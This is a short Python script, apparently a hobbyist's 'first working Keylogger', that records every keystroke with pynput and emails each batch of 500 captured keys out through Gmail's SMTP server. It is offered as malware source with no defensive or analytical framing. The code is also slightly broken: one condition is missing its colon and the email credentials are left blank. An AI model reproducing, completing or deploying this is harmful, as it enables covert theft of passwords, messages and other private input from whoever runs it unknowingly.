#This is my first working Keylogger, gonna improve it in the future
import pynput
from pynput.keyboard import Key, Listener
import smtplib, ssl

EMAIL =
PASSWORD =
words = 0
keys = []

def on_press(key):
    global words, keys

    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = " "
    if key == 'Key.shift':
        key = "`SHIFT`"
    if key == 'Key.enter':
        key = "\n"
    if key == 'Key.backspace':
        key = "`BACKSPACE`"
    if key == 'Key.esc'
        key = '`ESC`'
    if key == 'Key.tab':
        key = '`TAB`'
    if key == 'Key.caps_lock':
        key = '`CAPS`'
    if key == 'Key.ctrl':
        key = '`CTRL`'
    if key == 'Key.cmd':
        key = '`WINBTN`'
    if key == 'Key.tabkey':
        key = '`TAB`'


    keys.append(key)

    words += 1

    if words >= 500 :
        words = 0
        f = ''.join(keys)
        sender(EMAIL, PASSWORD, f)
        keys = []

def sender(Email, Password, content):

    server = smtplib.SMTP_SSL('smtp.gmail.com', port=465)
    server.login(Email, Password)
    server.sendmail(Email, Email, content)
    server.quit()

with Listener(on_press=on_press) as listener:
    listener.join()
